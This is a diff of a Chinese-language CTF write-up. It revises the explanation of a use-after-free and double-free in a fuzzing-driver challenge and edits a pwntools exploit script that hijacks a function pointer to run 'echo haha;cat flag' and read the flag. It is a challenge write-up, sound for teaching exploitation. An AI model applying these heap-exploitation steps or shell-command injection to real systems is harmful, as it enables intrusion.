@@ -107,14 +107,19 @@ __int64 stopfuzz()
 5. add a new driver
 6. stop fuzzing
 7. prepare fuzz data
+8. start fuzzing
 
-调用1 2 3会为ptr[0] data[0] data[1]分配内存，调用会释放ptr[0]的所对应的块，但是由于ptr[0]在3秒内并不会被置空。
+调用1 2 3会为ptr[0] data[0] data[1]分配内存
 
-5被调用后，ptr[1]会被重新分配ptr[0]所指向的内存，也就是说ptr[0]与ptr[1]指向的是同一块内存，
+调用4会释放ptr[0]的所对应的块，且ptr[0]在3秒内并不会被置空。
 
-接着调用6，ptr[0]与ptr[1]所指向的内存会被再次free，由于ptr[0]与ptr[1]指向同一块内容，所以根据stop fuzzing的处理函数的逻辑，只有ptr[0]会被在3秒后置0，ptr[1]则会指向一个被free的内存块
+调用5后，ptr[1]会被重新分配ptr[0]所指向的内存，也就是说ptr[0]与ptr[1]指向的是同一块内存，
 
-最后调用7，将ptr[1]所指向的内存重新分配到字符串readdata中，通过对readdata进行修改即可控制ptr[1]所指向的带有函数指针的结构体的值。从而劫持控制流。
+接着调用6，ptr[0]与ptr[1]所指向的内存会被再次free，由于ptr[0]与ptr[1]指向同一块内容，所以根据stop fuzzing的处理函数的逻辑，根据驱动名匹配永远都回得到ptr[0],也就是说只有ptr[0]会被在3秒后置0，ptr[1]则会指向一个被free的内存块
+
+之后调用7，将ptr[1]所指向的内存重新分配到字符串readdata中，通过对readdata进行修改即可控制ptr[1]所指向的带有函数指针的结构体的值。
+
+最后调用8，由于函数指针已在调用7后被修改，所以调用8可以直接劫持控制流。
 
 值得一提的是，由于我们拿到的shell是子线程的shell，所以我们无法直接与该shell进行交互，我们可以通过system("cat flag")拿到flag。
 
@@ -191,7 +196,7 @@ def attack(ip=0):
         io = remote(ip,port)
     newdriver("/dev/haha1");
     prepare(10,"haha1")
-    prepare(50,"cat flag > /dev/fd/1\x00")
+    prepare(50,"echo haha;cat flag")
     stopfuzz("/dev/haha1");
     usortbin=viewdriver();
     usortbin=usortbin+(8-len(usortbin))*'\x00';
@@ -210,7 +215,9 @@ def attack(ip=0):
     
     startfuzz("/dev/haha4");
     sleep(3)
-    readall()#get flag
+    readuntil("haha");
+    flag=readuntil("\n")[:-1]#get flag
+    return flag;
 
 attack()
 ```
